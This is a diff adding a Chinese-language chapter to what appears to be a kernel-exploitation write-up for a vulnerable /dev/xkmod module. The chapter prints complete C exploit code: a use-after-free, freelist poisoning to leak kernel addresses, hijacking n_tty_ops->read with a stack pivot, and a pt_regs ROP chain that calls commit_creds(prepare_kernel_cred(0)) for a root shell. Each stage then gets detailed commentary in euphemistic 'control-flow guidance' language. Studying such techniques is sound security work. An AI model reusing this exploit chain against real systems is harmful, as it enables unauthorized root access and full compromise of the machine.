@@ -1322,7 +1322,7 @@ pwndbg> x/s 0xffffffff82444740
 #4  0xffffffff811d2b10 in search_binary_handler (bprm=0xffff88800e0eac00) at fs/exec.c:1681
 #5  0xffffffff811d3f13 in exec_binprm (bprm=<optimized out>) at fs/exec.c:1702
 #6  __do_execve_file (fd=<optimized out>, filename=<optimized out>, flags=<optimized out>, file=<optimized out>, argv=..., envp=...) at fs/exec.c:1822
-#7  0xffffffff811d42cf in do_execveat_common (flags=<optimized out>, filename=<error reading variable: Cannot access memory at address 0x0>, fd=<optimized out>, 
+#7  0xffffffff811d42cf in do_execveat_common (flags=<optimized out>, filename=<error reading variable: Cannot access memory at address 0x0>, fd=<optimized out>,
     argv=..., envp=...) at fs/exec.c:1868
 #8  do_execve (__envp=<optimized out>, __argv=<optimized out>, filename=<error reading variable: Cannot access memory at address 0x0>) at fs/exec.c:1885
 #9  __do_sys_execve (envp=<optimized out>, argv=<optimized out>, filename=<optimized out>) at fs/exec.c:1961
@@ -1560,7 +1560,639 @@ flowchart TD
               height: auto;">
 </div>
 
+## 5. 进阶分析：tty_ldisc_ops结构利用
+
+exploit核心代码如下：
+
+```c
+#ifdef SECONDARY_STARTUP_64
+#undef SECONDARY_STARTUP_64
+#define SECONDARY_STARTUP_64 0xffffffff81000030
+#endif
+#define N_TTY_OPS 0xffffffff824b11e0
+#define N_TTY_READ 0xffffffff8145cff0
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00a3c
+#define PREPARE_KERNEL_CRED 0xffffffff81088a80
+#define COMMIT_CREDS 0xffffffff810888c0
+
+#define POP_RDI_RET 0xffffffff81001965
+#define ADD_RSP_0XC8_RET 0xffffffff81144acc
+#define XCHG_RDI_RAX_RET 0xffffffff8148c26f
+
+/* Global variables for kernel symbol addresses */
+size_t n_tty_ops;
+size_t n_tty_read;
+size_t commit_creds;
+size_t prepare_kernel_cred;
+size_t swapgs_restore_regs_and_return_to_usermode;
+
+size_t pop_rdi_ret;
+size_t xchg_rdi_rax_ret;
+
+/* Structure for interacting with the kernel module */
+struct chunk_info {
+    size_t *user_buffer;
+    size_t offset;
+    size_t length;
+};
+
+/* Wrapper functions for ioctl operations */
+void allocate_chunk(int device_fd, struct chunk_info *chunk) {
+    ioctl(device_fd, 0x1111111, chunk);
+}
+
+void edit_chunk(int device_fd, struct chunk_info *chunk) {
+    ioctl(device_fd, 0x6666666, chunk);
+}
+
+void read_chunk(int device_fd, struct chunk_info *chunk) {
+    ioctl(device_fd, 0x7777777, chunk);
+}
+
+/* File descriptors for the kernel device */
+static int device_fds[3];
+/* Chunk metadata for kernel operations */
+static struct chunk_info chunk;
+int main() {
+    /* Leaked addresses and offsets */
+    size_t heap_leak;
+    size_t page_offset_base;
+    /* Flag to track target chunk discovery */
+    int target_found = 0;
+
+    /* Phase 1: Initial setup */
+    log.info("Phase 1: Initial setup");
+    bind_core(0);
+    for (int i = 0; i < 3; i++) {
+        device_fds[i] = open("/dev/xkmod", O_RDONLY);
+        if (device_fds[i] < 0) {
+            log.error("Failed to open device");
+            exit(EXIT_FAILURE);
+        }
+    }
+
+    /* Phase 2: Construct Use-After-Free (UAF) */
+    log.info("Phase 2: Constructing UAF");
+    chunk.user_buffer = malloc(0x1000);
+    if (!chunk.user_buffer) {
+        log.error("Memory allocation failed");
+        exit(EXIT_FAILURE);
+    }
+    chunk.offset = 0;
+    chunk.length = 0x50;
+    memset(chunk.user_buffer, 0, 0x1000);
+
+    allocate_chunk(device_fds[0], &chunk);
+    close(device_fds[0]);  /* Trigger UAF by closing the file descriptor */
+
+    /* Phase 3: Leak kernel heap address and guess page_offset_base */
+    log.info("Phase 3: Leaking kernel heap address");
+    read_chunk(device_fds[1], &chunk);
+    heap_leak = chunk.user_buffer[0];
+    page_offset_base = heap_leak & 0xfffffffff0000000;
+    log.success("Kernel heap leak: 0x%lx", heap_leak);
+    log.success("Guessed page_offset_base: 0x%lx", page_offset_base);
+
+    /* Phase 4: Leak kernel base by allocating a fake chunk */
+    log.info("Phase 4: Leaking kernel base");
+    chunk.user_buffer[0] = page_offset_base + 0x9d000 - 0x10;
+    chunk.offset = 0;
+    chunk.length = 8;
+    edit_chunk(device_fds[1], &chunk);
+
+    /* Iterate through freelist to find a chunk with secondary_startup_64 pointer */
+    target_found = 0;
+    for (int i = 0; i < 21; i++) {
+        allocate_chunk(device_fds[1], &chunk);
+        chunk.length = 0x40;
+        read_chunk(device_fds[1], &chunk);
+        log.info("freelist->next chunk[%d] => %#-18lx, secondary_startup_64: %#-18lx",
+                 i, chunk.user_buffer[0], chunk.user_buffer[2]);
+        if (((chunk.user_buffer[2] & 0xfff) == (SECONDARY_STARTUP_64 & 0xfff)) && chunk.user_buffer[0] == 0x0) {
+            target_found = 1;
+            log.success("Found target chunk for kernel base leak");
+            break;
+        }
+    }
+    if (!target_found) {
+        log.error("Failed to leak kernel base. Exiting");
+        exit(EXIT_FAILURE);
+    }
+
+
+    kernel_offset = chunk.user_buffer[2] - SECONDARY_STARTUP_64;
+    kernel_base += kernel_offset;
+    n_tty_ops = kernel_offset + N_TTY_OPS;
+    n_tty_read = kernel_offset + N_TTY_READ;
+    log.success("Kernel base: 0x%lx", kernel_base);
+    log.success("Kernel offset: 0x%lx", kernel_offset);
+    log.success("n_tty_ops: 0x%lx", n_tty_ops);
+    log.success("n_tty_read: 0x%lx", n_tty_read);
+
+    /* Phase 5: Hijack n_tty_ops->read by manipulating the freelist */
+    log.info("Phase 5: Hijacking n_tty_ops->read");
+    allocate_chunk(device_fds[1], &chunk);
+    close(device_fds[1]);  /* Free the chunk to prepare for freelist poisoning */
+
+    chunk.user_buffer[0] = n_tty_ops - 0x10;
+    chunk.offset = 0;
+    chunk.length = 0x50;
+    edit_chunk(device_fds[2], &chunk);
+
+    target_found = 0;
+    struct tty_ldisc_ops *ops = NULL;
+    for (int i = 0; i < 21; i++) {
+        allocate_chunk(device_fds[2], &chunk);
+        read_chunk(device_fds[2], &chunk);
+        ops = (struct tty_ldisc_ops *)((char *)chunk.user_buffer + 0x10);
+        log.info("freelist->next chunk[%d] => %#-18lx, n_tty_read value: %#-18lx",
+                 i, chunk.user_buffer[0], (size_t)ops->read);
+        if ((size_t)ops->read == n_tty_read) {
+            target_found = 1;
+            log.success("Found target chunk! Overwriting n_tty_ops->read with gadget");
+            /* Replace n_tty_ops->read with ADD_RSP_0XC8_RET gadget for stack pivoting */
+            chunk.user_buffer[offsetof(struct tty_ldisc_ops, read) / 8 + 0x2] = kernel_offset + ADD_RSP_0XC8_RET;
+            edit_chunk(device_fds[2], &chunk);
+            break;
+        }
+    }
+    if (!target_found) {
+        log.error("Failed to hijack n_tty_ops->read. Exiting");
+        exit(EXIT_FAILURE);
+    }
+
+
+    log.info("Phase 6: Executing ROP chain for privilege escalation");
+    pop_rdi_ret = kernel_offset + POP_RDI_RET;
+    xchg_rdi_rax_ret = kernel_offset + XCHG_RDI_RAX_RET;
+    prepare_kernel_cred = kernel_offset + PREPARE_KERNEL_CRED;
+    commit_creds = kernel_offset + COMMIT_CREDS;
+    swapgs_restore_regs_and_return_to_usermode = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x16;
+
+    log.info("Setting up registers and triggering hijacked n_tty_ops->read");
+    __asm__(
+        "mov r15,   pop_rdi_ret;"
+        "xor r14,   r14;"
+        "mov r13,   prepare_kernel_cred;"
+        "mov r12,   xchg_rdi_rax_ret;"
+        "mov rbp,   commit_creds;"
+        "mov rbx,   swapgs_restore_regs_and_return_to_usermode;"
+        "mov r11,   0x66666666;"
+        "mov r10,   0x77777777;"
+        "mov r9,    0x88888888;"
+        "mov r8,    0x99999999;"
+        "xor rax,   rax;"
+        "mov rcx,   0xaaaaaaaa;"
+        "mov rdx,   8;"
+        "mov rsi,   rsp;"
+        "xor rdi,   rdi;"  /* Triggers the hijacked n_tty_ops->read via syscall */
+        "syscall"
+    );
+
+    log.info("Phase 7: Restoring n_tty_ops->read to original value");
+    chunk.user_buffer[offsetof(struct tty_ldisc_ops, read) / 8 + 0x2] = n_tty_read;
+    edit_chunk(device_fds[2], &chunk);
+    log.success("n_tty_ops->read restored to 0x%lx", n_tty_read);
+
+    /* Execute root shell */
+    get_root_shell();
+
+    /* Cleanup: close file descriptors and free allocated memory */
+    for (int i = 0; i < 3; i++) {
+        if (device_fds[i] >= 0) close(device_fds[i]);
+    }
+    free(chunk.user_buffer);
+    log.success("Exploit completed successfully");
+    return 0;
+}
+```
+
+本章深入探讨基于`tty_ldisc_ops`结构的高级控制流程引导技术。此技术展示在特定系统配置下，如何利用内核中的现有数据结构实现精密的控制流程管理，是前三章内存控制技术的自然延伸和深化。通过劫持终端线路规程的函数指针，实现在特定条件下的控制流程重定向，展示内核数据结构控制的技术深度。
+
+### 5-1. 技术背景与实现流程概述
+
+`tty_ldisc_ops`是Linux内核中线路规程(line discipline)的核心操作结构，包含处理终端输入输出的一系列函数指针。线路规程是终端子系统的重要组成部分，负责处理字符设备的逻辑层功能，包括字符转换、特殊信号处理等操作。
+
+**技术实现原理**：
+`n_tty_ops`是`tty_ldisc_ops`结构的一个实例，处理规范模式(n-canonical mode)的终端I/O。当用户空间程序通过终端设备进行读取操作时，内核会调用这些函数指针指向的处理函数。通过修改`n_tty_ops->read`函数指针，可以在特定的读取操作中实现控制流程重定向，为后续的控制流程引导提供技术基础。
+
+**完整技术验证流程**：
+整个验证过程延续前三章的技术框架，形成从环境准备到状态恢复的完整闭环：
+
+```mermaid
+flowchart TD
+    A[开始验证流程] --> B[阶段1: 环境初始化与资源准备]
+    B --> C[阶段2: SLUB内存状态精密构造]
+    C --> D[阶段3: 内核堆地址信息获取与分析]
+    D --> E[阶段4: 内核基址泄露与符号计算]
+    E --> F[阶段5: 修改n_tty_ops->read为ADD_RSP_0XC8_RET]
+    F --> G[阶段6: 寄存器状态控制与系统调用触发]
+    G --> H[阶段7: 控制流程执行与权限提升]
+    H --> I[阶段8: 原始状态恢复与资源清理]
+    I --> J[技术验证完成与结果分析]
+
+    style A fill:#e1f5fe,stroke:#2196f3,stroke-width:2px
+    style B fill:#e1f5fe
+    style C fill:#e1f5fe
+    style D fill:#c8e6c9
+    style E fill:#c8e6c9
+    style F fill:#fff3e0
+    style G fill:#f3e5f5
+    style H fill:#c8e6c9
+    style I fill:#fff3e0
+    style J fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**各阶段技术关联性**：
+每个阶段构成紧密的技术链条，前一阶段的输出是后一阶段的输入，形成完整的控制流程引导路径。从环境初始化开始，逐步构建复杂的内存状态，最终实现精确的控制流程引导，最后完成系统状态恢复，确保技术验证的完整性和可重复性。
+
+### 5-2. 内核地址计算与符号解析
+
+基于获取的内核基址，通过预定义的符号偏移计算多个关键内核符号的实际地址。此过程体现内核符号地址相对固定的特性，即使在KASLR保护下，符号间的相对偏移保持不变。
+
+**符号偏移预定义**：
+根据exploit.c代码，关键内核符号的预定义偏移如下，这些偏移基于特定内核版本的符号布局确定：
+
+```c
+#ifdef SECONDARY_STARTUP_64
+#undef SECONDARY_STARTUP_64
+#define SECONDARY_STARTUP_64 0xffffffff81000030
+#endif
+#define N_TTY_OPS 0xffffffff824b11e0
+#define N_TTY_READ 0xffffffff8145cff0
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00a3c
+#define PREPARE_KERNEL_CRED 0xffffffff81088a80
+#define COMMIT_CREDS 0xffffffff810888c0
+
+#define POP_RDI_RET 0xffffffff81001965
+#define ADD_RSP_0XC8_RET 0xffffffff81144acc
+#define XCHG_RDI_RAX_RET 0xffffffff8148c26f
+```
+
+**内核地址计算**：
+通过从内核内存中泄露的`secondary_startup_64`函数地址，计算实际内核基址与预定义基准之间的偏移量。基于此偏移量，推导出所有关键符号的实际运行时地址：
+
+```c
+kernel_offset = chunk.user_buffer[2] - SECONDARY_STARTUP_64;
+kernel_base += kernel_offset;
+
+n_tty_ops = kernel_offset + N_TTY_OPS;
+n_tty_read = kernel_offset + N_TTY_READ;
+commit_creds = kernel_offset + COMMIT_CREDS;
+prepare_kernel_cred = kernel_offset + PREPARE_KERNEL_CRED;
+pop_rdi_ret = kernel_offset + POP_RDI_RET;
+xchg_rdi_rax_ret = kernel_offset + XCHG_RDI_RAX_RET;
+swapgs_restore_regs_and_return_to_usermode = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x16;
+```
+
+**地址计算验证**：
+计算得到的地址通过多重验证确保准确性，包括调试器现场验证、内存读取验证和逻辑一致性验证。调试器可检查`n_tty_ops`结构的实际内存内容，确认计算结果的正确性，确保后续控制流程引导的可靠性。
+
+### 5-3. pt_regs结构原理与寄存器状态控制
+
+在x86_64架构中，当通过`syscall`指令进入内核时，内核会将用户空间的寄存器状态按特定顺序保存到内核栈上，形成`pt_regs`数据结构。这是控制流程引导技术的核心原理基础，通过理解`pt_regs`结构，可实现在内核栈上构建预定的控制流程执行环境。
+
+**pt_regs数据结构原理**：
+`pt_regs`结构在内核栈上按固定顺序保存寄存器状态，从栈顶的r15开始，依次保存r14、r13等寄存器，最后保存ss寄存器，形成完整的执行上下文保存结构。此固定布局为控制流程引导提供可预测性和精确的技术控制基础。
+
+**数据结构完整布局**：
+
+```c
+struct pt_regs {
+    unsigned long r15;    // 栈顶位置，保存第一个控制流程寄存器
+    unsigned long r14;    // 保存参数寄存器
+    unsigned long r13;    // 保存内核函数地址
+    unsigned long r12;    // 保存寄存器操作序列地址
+    unsigned long bp;     // 保存内核功能函数地址
+    unsigned long bx;     // 保存返回用户空间例程地址
+    unsigned long r11;    // 布局控制寄存器1
+    unsigned long r10;    // 布局控制寄存器2
+    unsigned long r9;     // 布局控制寄存器3
+    unsigned long r8;     // 布局控制寄存器4
+    unsigned long ax;     // 系统调用号
+    unsigned long cx;     // 布局控制寄存器5
+    unsigned long dx;     // 读取长度参数
+    unsigned long si;     // 缓冲区地址
+    unsigned long di;     // 文件描述符
+    unsigned long orig_ax; // 原始系统调用号
+    unsigned long ip;     // 返回地址
+    unsigned long cs;     // 代码段选择子
+    unsigned long flags;  // 标志寄存器
+    unsigned long sp;     // 用户栈指针
+    unsigned long ss;     // 栈段选择子
+};
+```
+
+**寄存器状态精密控制**：
+基于exploit.c代码，通过内联汇编设置用户空间寄存器的值，为后续控制流程引导构建执行环境。寄存器设置包括控制流程构建寄存器、功能执行寄存器、系统调用参数寄存器和栈布局控制寄存器，每个寄存器的值都经过精心选择：
+
+```c
+__asm__(
+    "mov r15,   pop_rdi_ret;"        // 控制流程起始地址
+    "xor r14,   r14;"                // 函数参数值
+    "mov r13,   prepare_kernel_cred;" // 内核功能函数地址1
+    "mov r12,   xchg_rdi_rax_ret;"   // 寄存器操作序列
+    "mov rbp,   commit_creds;"       // 内核功能函数地址2
+    "mov rbx,   swapgs_restore_regs_and_return_to_usermode;" // 返回用户空间例程
+    "mov r11,   0x66666666;"         // 布局控制值
+    "mov r10,   0x77777777;"         // 布局控制值
+    "mov r9,    0x88888888;"         // 布局控制值
+    "mov r8,    0x99999999;"         // 布局控制值
+    "xor rax,   rax;"                // 系统调用号0(read)
+    "mov rcx,   0xaaaaaaaa;"         // 布局控制值
+    "mov rdx,   8;"                  // 读取长度
+    "mov rsi,   rsp;"                // 缓冲区地址
+    "xor rdi,   rdi;"                // 文件描述符0(标准输入)
+    "syscall"                        // 触发系统调用
+);
+```
+
+**内核栈布局构建**：
+执行`syscall`指令后，内核将寄存器状态按`pt_regs`结构定义的顺序保存到内核栈。从栈顶的r15开始，依次保存r14、r13等寄存器，最后保存ss寄存器，形成完整的控制流程执行环境。此有序的保存过程为后续控制流程引导提供精确的内存布局基础，确保栈迁移后控制流程能准确跳转到预定的ROP链位置。
+
+### 5-4. 从read系统调用到n_tty_ops->read的完整调用链
+
+当用户空间程序执行`syscall`指令触发read系统调用时，会触发从用户空间到内核空间的完整调用链。理解此路径对控制流程引导至关重要，以下是基于Linux内核执行流程的完整调用链分析。
+
+**系统调用完整路径**：
+从用户空间执行`syscall`指令开始，控制流程进入内核的系统调用入口。经过系统调用分发机制，到达具体的处理函数，最终通过多层函数调用到达目标函数指针位置。每个函数调用都承载特定的职责，从通用处理到特定设备操作，最终到达目标函数指针。
+
+```mermaid
+flowchart TD
+    A["用户空间: 执行syscall指令触发read(0)系统调用"] --> B[entry_SYSCALL_64<br/>x86_64架构系统调用入口点]
+    B --> C[do_syscall_64<br/>系统调用分发与参数处理]
+    C --> D[__x64_sys_read<br/>x86_64架构read系统调用处理函数]
+    D --> E[ksys_read<br/>内核空间通用读取包装函数]
+    E --> F[vfs_read<br/>虚拟文件系统层通用读取处理]
+    F --> G[tty_read<br/>终端设备特定读取处理函数]
+    G --> H[tty_ldisc_ref_N_tty<br/>获取N_TTY线路规程操作结构]
+    H --> I[调用n_tty_ops->read<br/>线路规程特定读取处理]
+    I --> J[控制流程跳转到ADD_RSP_0XC8_RET<br/>因指针被修改而触发栈迁移]
+    J --> K[栈指针调整: RSP增加0xc8字节<br/>迁移到pt_regs结构位置]
+    K --> L[控制流程重定向: 执行预置ROP链<br/>按预定路径执行权限提升]
+
+    subgraph 用户空间
+        A
+    end
+
+    subgraph 内核空间
+        B
+        C
+        D
+        E
+        F
+        G
+        H
+        I
+        J
+        K
+        L
+    end
+
+    style A fill:#e1f5fe
+    style B fill:#d4edda
+    style C fill:#d1ecf1
+    style D fill:#d4edda
+    style E fill:#d1ecf1
+    style F fill:#d4edda
+    style G fill:#d1ecf1
+    style H fill:#d4edda
+    style I fill:#ffccbc
+    style J fill:#c8e6c9
+    style K fill:#fff3e0
+    style L fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**调用链详细说明**：
+
+1. **系统调用入口**：`syscall`指令触发硬件中断，控制流程跳转到内核的系统调用入口函数`entry_SYSCALL_64`，这是x86_64架构的标准系统调用入口点，负责保存用户空间寄存器状态到`pt_regs`结构。
+
+2. **系统调用分发**：内核根据系统调用号(rax=0)分发到相应的处理函数`do_syscall_64`，此函数负责参数处理和调用正确的系统调用处理程序，确保系统调用的正确执行。
+
+3. **系统调用处理**：调用具体的系统调用处理函数`__x64_sys_read`，这是x86_64架构下read系统调用的处理函数，负责参数验证和初步处理，确保读取操作的合法性。
+
+4. **内核读取函数**：进入内核空间的通用读取处理函数`ksys_read`，此函数提供内核空间的标准读取接口，处理通用的读取逻辑。
+
+5. **虚拟文件系统层**：经过虚拟文件系统层的处理函数`vfs_read`，确保文件系统独立性，处理通用文件读取逻辑，为不同文件系统提供统一接口。
+
+6. **终端设备层**：进入终端设备的特定处理函数`tty_read`，此函数专门处理终端设备的读取操作，负责终端特定的读取逻辑。
+
+7. **线路规程获取**：通过`tty_ldisc_ref_N_tty`获取当前终端的线路规程操作结构，具体是`n_tty_ops`结构，这是处理规范模式终端I/O的操作表，包含终端特定的处理函数。
+
+8. **函数指针调用**：通过操作结构中的函数指针调用`n_tty_ops->read`，正常情况下会调用`n_tty_read`函数处理终端读取，但此时指针已被修改。
+
+9. **栈迁移触发**：由于`n_tty_ops->read`指针已被修改为`ADD_RSP_0XC8_RET`地址，控制流程跳转到栈迁移指令序列，开始栈迁移过程。
+
+**系统调用参数传递**：
+系统调用参数通过寄存器传递给内核，确保读取操作的正确执行：
+
+- `rax = 0`：系统调用号，指定`sys_read`操作
+- `rdi = 0`：文件描述符，0表示标准输入
+- `rsi = rsp`：缓冲区地址，设置为当前栈指针
+- `rdx = 8`：读取长度，控制操作的数据量
+- `rcx = 0xaaaaaaaa`：布局控制值，确保栈结构完整性
+
+### 5-5. 栈迁移技术与控制流程重定向
+
+通过修改`n_tty_ops->read`函数指针为栈迁移指令序列`ADD_RSP_0XC8_RET`，实现从原始执行环境到预置控制流程环境的精确转移。栈迁移技术是实现控制流程引导的关键环节，确保控制流程能跳转到精心布置的执行环境。
+
+**栈迁移技术原理**：
+`ADD_RSP_0XC8_RET`指令序列将栈指针增加0xc8字节，此偏移量经过精心计算，确保栈指针迁移后正好指向内核栈上`pt_regs`结构中的r15寄存器位置。通过此栈迁移技术，控制流程从正常的终端读取处理路径重定向到预置的ROP链执行环境，为后续权限提升操作提供技术基础。
+
+**栈迁移偏移计算**：
+0xc8偏移的计算基于`pt_regs`结构在内核栈上的精确布局。从`pt_regs`结构起始位置到r15寄存器保存位置的距离为0xc8字节，此精确计算确保栈指针迁移后能正确定位到控制流程起始位置。栈迁移后，新的栈指针指向`pt_regs.r15`位置，其值为`pop_rdi_ret`地址，控制流程开始按预定路径执行。
+
+**栈迁移前后状态对比**：
+
+```
+栈迁移前栈指针位置：
++---------------------+
+| 内核栈其他数据      |
++---------------------+
+| pt_regs结构起始位置 | ← RSP
++---------------------+
+
+执行ADD_RSP_0XC8_RET后：
++---------------------+
+| 内核栈其他数据      |
++---------------------+
+| pt_regs结构起始位置 |
++---------------------+
+| ...                 |
++---------------------+
+| pt_regs.r15         | ← 新的RSP位置
++---------------------+
+```
+
+**控制流程重定向机制**：
+栈迁移完成后，控制流程跳转到`pt_regs.r15`位置保存的地址，即`pop_rdi_ret`指令序列。此重定向机制将正常的终端读取处理流程转换为预置的ROP链执行流程，实现控制流程的精确引导。栈迁移技术的成功实施依赖于对内核栈布局的深入理解和精确计算，确保控制流程重定向的准确性和可靠性。
+
+### 5-6. ROP链执行与权限提升流程
+
+当栈迁移完成后，控制流程跳转到`pt_regs.r15`位置保存的`pop_rdi_ret`地址，开始执行预置的ROP链。此ROP链经过精心设计，实现`commit_creds(prepare_kernel_cred(0))`的调用序列，完成权限提升操作，最后通过`swapgs_restore_regs_and_return_to_usermode`返回用户空间。
+
+**完整ROP链执行路径**：
+ROP链执行从栈迁移后的控制流程重定位开始，经过参数设置、函数调用、寄存器优化、权限应用和环境恢复等多个阶段，最终完成权限提升。每个阶段都经过精心设计，确保控制流程的连续性和正确性。
+
+```mermaid
+flowchart TD
+    A[控制流程跳转: ADD_RSP_0XC8_RET] --> B[栈指针调整: RSP增加0xc8字节]
+    B --> C[控制流程重定位: RSP指向pt_regs.r15位置]
+    C --> D[执行pop_rdi_ret序列: 从栈弹出r14值到rdi]
+    D --> E[参数传递: RDI = 0]
+    E --> F["控制流程转移: 执行prepare_kernel_cred(0)"]
+    F --> G[凭证创建: RAX = 新cred结构指针]
+    G --> H[寄存器交换: 执行xchg_rdi_rax_ret序列]
+    H --> I[参数优化: RDI = cred指针, RAX = 0]
+    I --> J["控制流程转移: 执行commit_creds(cred)"]
+    J --> K[权限应用: 当前进程获得权限提升]
+    K --> L[环境恢复: 执行swapgs_restore_regs_and_return_to_usermode]
+    L --> M[返回用户空间: 控制流程正常返回]
+    M --> N[权限验证: 验证权限提升结果]
+
+    style A fill:#e1f5fe
+    style B fill:#fff3e0
+    style C fill:#e1f5fe
+    style D fill:#c8e6c9
+    style E fill:#fff3e0
+    style F fill:#c8e6c9
+    style G fill:#fff3e0
+    style H fill:#c8e6c9
+    style I fill:#fff3e0
+    style J fill:#c8e6c9
+    style L fill:#c8e6c9
+    style M fill:#c8e6c9
+    style N fill:#c8e6c9,stroke:#4caf50,stroke-width:2px
+```
+
+**详细执行步骤分析**：
+
+1. **控制流程跳转**：`ADD_RSP_0XC8_RET`指令将栈指针增加0xc8字节，跳过部分栈数据，为控制流程重定位创造条件。栈迁移后，新的栈指针指向`pt_regs.r15`位置。
+
+2. **栈指针重定位**：新的栈指针指向`pt_regs.r15`寄存器保存位置，其值为`pop_rdi_ret`地址，控制流程开始按预定ROP链执行。
+
+3. **参数环境准备**：执行`pop_rdi_ret`指令序列，从栈弹出r14值到rdi寄存器，为后续函数调用准备参数。此时r14值为0，因此RDI寄存器被设置为0。
+
+4. **函数地址获取**：控制流程继续执行，从栈弹出r13地址（`prepare_kernel_cred`函数地址），控制流程转到内核功能函数。
+
+5. **凭证创建**：调用`prepare_kernel_cred(0)`创建新的凭证结构，返回的cred结构指针保存在rax寄存器。此函数基于参数0创建具有最高权限的凭证结构。
+
+6. **寄存器优化**：执行`xchg_rdi_rax_ret`交换rdi和rax寄存器的值，优化参数传递。执行后，RDI寄存器包含新创建的cred指针，RAX寄存器为0，为下一步函数调用准备正确的参数。
+
+7. **权限应用**：从栈弹出rbp地址（`commit_creds`函数地址）并调用，将新创建的凭证应用到当前进程。此操作完成进程权限提升。
+
+8. **环境恢复**：从栈弹出rbx地址（`swapgs_restore_regs_and_return_to_usermode`返回例程地址）并执行，恢复内核-用户空间执行环境。此函数处理必要的环境切换操作，确保控制流程能安全返回用户空间。
+
+9. **控制流程返回**：正常返回用户空间，完成权限验证操作，控制流程引导过程结束。返回后，当前进程具有提升后的权限。
+
+**栈状态动态变化**：
+控制流程执行过程中，内核栈状态经历精确的逐步变化。栈指针的每次移动都经过精心计算，确保控制流程能按预定路径执行。从初始栈状态开始，经过栈迁移、参数弹出、函数调用和返回，最终恢复到用户空间执行环境。
+
+```
+初始栈状态（执行ADD_RSP_0XC8_RET前）：
++---------------------+
+| 内核栈其他数据      |
++---------------------+
+| pt_regs.r15         | ← 栈迁移目标位置
++---------------------+
+| pt_regs.r14         | ← 参数值0
++---------------------+
+| pt_regs.r13         | ← prepare_kernel_cred地址
++---------------------+
+| pt_regs.r12         | ← xchg_rdi_rax_ret地址
++---------------------+
+| pt_regs.bp          | ← commit_creds地址
++---------------------+
+| pt_regs.bx          | ← swapgs_restore...地址
++---------------------+
+
+控制流程逐步执行：
+1. 栈迁移到pt_regs.r15，执行pop_rdi_ret，弹出r14的0到rdi
+2. 控制流程转移到prepare_kernel_cred(0)，创建新凭证
+3. 执行xchg_rdi_rax_ret，交换寄存器值
+4. 控制流程转移到commit_creds(cred)，应用新凭证
+5. 执行swapgs_restore_regs_and_return_to_usermode，返回用户空间
+```
+
+**技术关键点分析**：
+
+1. **栈迁移精确性**：0xc8偏移经过精心计算，确保RSP正确定位到`pt_regs.r15`位置，这是控制流程引导成功的技术基础。
+
+2. **控制流程连续性**：每个步骤自然衔接，形成完整的控制流程执行链，确保控制流程能按预定路径连续执行。
+
+3. **寄存器协同**：寄存器间协同工作，优化执行效率和控制流程传递，提高控制流程引导的成功率和可靠性。
+
+4. **状态可恢复**：执行后能正常返回用户空间，保持系统执行环境的稳定性，确保控制流程引导对系统的影响最小化。
+
+### 5-7. 原始状态恢复与权限验证
+
+在完成控制流程引导和权限提升操作后，恢复`n_tty_ops->read`的原始值是确保系统稳定性的重要环节。此恢复操作体现对系统完整性的尊重，避免因函数指针修改导致的系统不稳定或功能异常，确保技术验证的完整性和可重复性。
+
+**恢复操作实现**：
+恢复操作的实现遵循与函数指针劫持相似的技术路径，但目标是将修改后的指针值还原为原始状态。首先确认当前内存状态，通过读取操作验证`n_tty_ops`结构的当前位置和控制权状态。然后计算`read`函数指针在数据结构中的精确偏移，此偏移计算需要基于对`tty_ldisc_ops`结构内存布局的准确理解。在确认偏移位置后，执行恢复操作将函数指针的值从`ADD_RSP_0XC8_RET`指令地址改回原始的`n_tty_read`函数地址。
+
+**权限验证与root shell获取**：
+在控制流程引导完成并返回用户空间后，进行权限验证操作。通过检查当前进程的有效用户ID，确认权限提升是否成功。验证通过后，执行`system("/bin/sh")`函数，启动具有root权限的shell环境。此操作通过调用`execve`系统调用执行`/bin/sh`程序，为后续操作提供高权限执行环境。
+
+**恢复的重要性**：
+
+1. **系统稳定性维护**：避免因函数指针修改导致的系统不稳定，防止内核崩溃或异常行为，确保系统能继续正常运行。
+
+2. **功能完整性保护**：保持终端读取功能的正常使用，确保系统交互不受影响，维护系统功能的完整性。
+
+3. **痕迹最小化**：减少对系统状态的影响，符合最小影响原则，降低技术验证对系统的长期影响。
+
+4. **可重复性保障**：为后续技术验证提供清洁的环境，确保技术验证过程的可重复性和可验证性。
+
+**恢复后验证**：
+恢复后验证是确认操作成功的关键步骤。通过再次读取`n_tty_ops`结构并检查`read`指针的值，确认恢复操作已正确执行。还可通过调试器验证恢复结果，检查目标内存位置的值是否已恢复为原始函数地址，确认系统状态已恢复正常。此验证确保终端子系统能继续正常工作，不会因技术验证留下永久性影响。
+
+**资源清理**：
+完成所有操作后，执行完整的资源清理流程。包括关闭所有打开的文件描述符、释放分配的用户空间内存、清理临时数据等，确保系统状态完全恢复。资源清理操作遵循标准的内存管理原则，防止资源泄漏和系统状态残留。最终的技术验证结果分析和权限验证确保整个技术流程既达到权限提升的目标，又最大程度降低对系统的影响。
+
+### 5-8. 技术对比与演进分析
+
+本章介绍的`tty_ldisc_ops`结构控制流程引导技术与第三章讨论的`modprobe_path`技术代表两种不同的内核控制流程管理方法。两者的技术特性和适用场景各有侧重，体现内核控制流程引导技术的多样性和发展脉络。
+
+**与modprobe_path技术对比**：
+
+| 对比维度   | tty_ldisc_ops控制流程引导技术      | modprobe_path路径控制技术        |
+| ---------- | ---------------------------------- | -------------------------------- |
+| 控制层级   | 内核函数指针级，直接控制执行流程   | 内核数据变量级，间接控制执行路径 |
+| 触发机制   | 系统调用直接触发，即时性高         | 文件执行间接触发，存在延迟       |
+| 执行环境   | 完全在内核空间完成，隐蔽性好       | 需要内核-用户空间协作            |
+| 技术复杂度 | 高，需要精确控制栈布局和寄存器状态 | 中，主要是内存修改和路径设置     |
+| 可靠性     | 中，依赖精确计算和栈布局控制       | 高，基于成熟的内核机制           |
+| 通用性     | 中，依赖特定内核符号和结构         | 高，适用于大多数系统             |
+| 系统影响   | 小，可完全恢复原始状态             | 中，需要修改系统路径             |
+
+**技术演进关系**：
